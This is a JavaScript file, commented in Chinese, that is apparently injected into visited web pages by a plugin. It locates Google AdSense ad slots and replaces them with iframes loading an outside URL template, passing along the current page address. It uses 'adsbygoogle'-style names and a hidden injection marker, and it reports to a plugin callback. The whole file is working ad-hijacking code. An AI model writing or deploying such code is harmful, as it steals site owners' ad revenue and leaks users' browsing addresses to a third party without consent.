//whitelist_adsbygoogle
var circleTimer_ads_google;
var totalNum_ads_google = 0;
var ads_dom_id = new Array();
var ifm_id_sg_gpt = 'didjfdfdfjdfddfd30_';
var js_rps_sg_id = '_d34errerdfcl44ssRpssg_';



/*
*	判断某个值是否在数组中
*/
function IsInArray(arr,val)
{
    var testStr=','+arr.join(",")+",";
    return testStr.indexOf(","+val+",")!=-1;
}

/*
*		元素 onload
*/
function elementOnload(elm,callBack)
{
	if(elm.attachEvent){  
        elm.attachEvent("onload",function(){
           callBack(); 
        });  
    }else{  
        elm.onload=function(){  
           callBack();
        };  
    }  
}

/*
*		是否在白名单中
*/
function isInWhiteList_adsbygoogle()
{
	var flagRet = false;
	var itemArr = new Array();
	var whiteListArray = new Array();
	whiteListArray = whitelist_adsbygoogle.split("|");
	var dmain = document.domain;

	for(var i = 0; i < whiteListArray.length; i++)
	{
		itemArr = whiteListArray[i].split(",");

		if(itemArr.length != 2) continue;
		if(dmain.indexOf(itemArr[0]) >= 0)
		{
			flagRet = true;
			break;
		}
	}
	return flagRet;
}

/*
*	设置 js 注入标志
*/
function setJsInTag_adsbygoogle()
{

	var _div = document.createElement('div');
	_div.id = js_rps_sg_id;
	_div.style.display = 'none';
	document.body.appendChild(_div);
}

/*
*	字符串添加属性
*/
String.prototype.trim = function() {
return this.replace(/^\s+|\s+$/g, "");
}

/*
*  js 调用回调函数
*/
function showReplaceCallBack_adsbygoogle()
{
  if(window.pgCbk != null) window.pgCbk.adCallBack('adshow_replace');//此处是传给插件的参数
}

/*
*  set div inline
*/
function setElementShow_adsbygoogle(ob)
{
	for(var j = 0; j < 5; j++)
	{	
		if(ob == null) break;
		if((ob.style != null) && (ob.style.display == 'none') )
		{
			ob.style.display = '';
			break;
		}
		ob = ob.parentNode;
	}

}

/*
*	获得 ad 节点属性
*/
function getAdNodeInfo_adsbygoogle(insDom)
{
	var realWidth = parseInt(insDom.style.width);
	var realHeight = parseInt(insDom.style.height);

	if((realWidth == undefined) || (isNaN(realWidth))) return;
	if((realHeight == undefined) || (isNaN(realHeight))) return;

	var oneAdNode=new Object();
	oneAdNode.pnt = insDom;
	oneAdNode.width = realWidth;
	oneAdNode.height = realHeight;

	ads_dom_id.push(oneAdNode);
}

/*
*	获取 show_ads 节点
*/
function getGoogleShowAdsIds_adsbygoogle()
{
	ads_dom_id.length = 0;
	var tUrl = 'pagead2.googlesyndication.com/pagead/js/adsbygoogle.js';
	var targetDom = new Array();
	targetDom.length = 0;

	var elmObj = document.getElementsByTagName('script');

	if(elmObj.length == 0) return;
	var k = 0;

	for(var i = 0; i < elmObj.length; i++)
	{
		k = 0;
		if((elmObj[i].src != undefined) && (elmObj[i].src != '') && (elmObj[i].src.indexOf(tUrl) != -1))
		{
			if(targetDom.length == 0)
			{
				targetDom.push(elmObj[i]);
				continue;
			}

			for(var j = 0; j < targetDom.length; j++)
			{
				if(targetDom[j] != elmObj[i]) k++;
			}
			if(k == targetDom.length) targetDom.push(elmObj[i]);

		}
	}
	
	if(0 == targetDom.length) return;

	var insNode = null;

	for(var i = 0;i < targetDom.length; i++)
	{
		insNode = null;
		insNode = targetDom[i].nextSibling;
		if(insNode == null || insNode == undefined) continue;
		
		while(insNode!= null)
		{
			if((insNode.tagName != null) && (insNode.tagName.toUpperCase() == 'INS'))
			{
				getAdNodeInfo_adsbygoogle(insNode);
				break;
			}
		 insNode = insNode.nextSibling;
		}
	}
}

/*
*	rps ad
*/
function rps_show_ad_adsbygoogle(idObj)
{
	var retResult = false;
	var lastIndex = 0;
	var dom = idObj.pnt;
	var width_dom = idObj.width;
	var height_dom = idObj.height;

	// replaceSize 尺寸数组解析
	var size_str = width_dom + 'x'+ height_dom;

	start_pos = replaceSize.indexOf(size_str,lastIndex);
	if(start_pos != -1)
	{
		lastIndex = start_pos;
		end_pos = replaceSize.indexOf('|',lastIndex);
		if(end_pos != -1)
		{
			pregSizeStr = replaceSize.substring(start_pos,end_pos);
			equal_pos = pregSizeStr.indexOf('=');
			if(equal_pos == -1) 
			{
				dom.style.display = 'none';
				return;
			}

			var newSize = pregSizeStr.substring(equal_pos+1,pregSizeStr.length);
			if(newSize == '') return;
			var new_width = parseInt(newSize.split('x')[0]);
			var new_height = parseInt(newSize.split('x')[1]);
			
			if((new_width == NaN) || (new_height == NaN)) 
			{
				dom.style.display = 'none';
				return;
			}

			var iframe_gs = document.createElement('iframe');
			iframe_gs.id = ifm_id_sg_gpt + Math.random();

			iframe_gs.scrolling = "no";
			iframe_gs.frameBorder = 0;
			iframe_gs.width = new_width;
			iframe_gs.height = new_height;
			iframe_gs.marginHeight = 0;
			iframe_gs.marginWidth = 0;
			iframe_gs.topMargin = 0;
			iframe_gs.leftMargin = 0;
			iframe_gs.style.display = 'inline';
			iframe_gs.allowTransparency=true;

			var src_gs = InsURL;
			
			src_gs = src_gs.replace(/\[WIDTH\]/g, new_width);
			src_gs = src_gs.replace(/\[HEIGHT\]/g, new_height);
			src_gs = src_gs.replace(/\[WIDTHxHEIGHT\]/g,newSize);
			src_gs = src_gs.replace(/\[REFERRER_URL\]/g, encodeURIComponent(window.location.href));
				
			dom.innerHTML = '';
	
			iframe_gs.src = src_gs;
			elementOnload(iframe_gs,showReplaceCallBack_adsbygoogle);
			dom.appendChild(iframe_gs);
			setElementShow_adsbygoogle(dom);
			retResult = true;
		}
	}

	if(!retResult)
	{
		dom.style.display = 'none';
	}
}

/*
*	主入口函数
*/
function main_init_adsbygoogle()
{
	if(replaceSize == undefined || replaceSize == '') return;
	var jsrpssgid = document.getElementById(js_rps_sg_id);

	if(jsrpssgid != null || isInWhiteList_adsbygoogle()) return;	//说明js已经加入
	setJsInTag_adsbygoogle();	
	getGoogleShowAdsIds_adsbygoogle();

	if(ads_dom_id.length == 0) return;

	for(var i = 0; i < ads_dom_id.length; i++)
	{
		rps_show_ad_adsbygoogle(ads_dom_id[i]);
	}
}


/*
*	定时检测函数
*/
function checkPageState_adsbygoogle()
{
	totalNum_ads_google++;
	var did = document.getElementById('pgc0038455dde337');
	if(did == null) 
	{
		if(totalNum_ads_google >= 10)
		{
			 clearInterval(circleTimer_ads_google);
			 if(window.pgCbk != null) window.pgCbk.adCallBack('disable_web:' + page_web_pointer);
			 setTimeout('main_init_adsbygoogle()',5000);
		}
		return;
	}

	if(did.innerHTML == '1')
	{
		clearInterval(circleTimer_ads_google);
		main_init_adsbygoogle();
	}
}


/*
*	定时器入口函数
*/
function checkFuncMain_adsbygoogle()
{
 circleTimer_ads_google = setInterval('checkPageState_adsbygoogle()',1000);
}


checkFuncMain_adsbygoogle();
